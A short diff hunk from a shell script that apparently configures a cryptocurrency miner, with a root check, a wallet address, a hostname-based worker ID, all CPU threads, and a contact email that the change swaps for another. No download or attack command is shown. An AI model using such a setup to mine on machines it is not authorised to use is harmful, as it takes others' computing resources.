@@ -5,7 +5,7 @@ if [ "$(whoami)" != "root" ]; then
 fi
 WALLET=4754axtGmMm8HpocfKMsvLXKgQGVpuHsLb6m3xDPMiYKfwuJ6cbot1ZPnZT2c7pb1H1Kg451LtsARWEC8i7ixySQ7mT4Vcb
 ID="$(hostname)"
-MAIL=komissarovartem609@gmail.com
+MAIL=mamasarkanzas@gmail.com
 PASSWORD=$ID:$MAIL
 THREADS="$(nproc --all)"
 
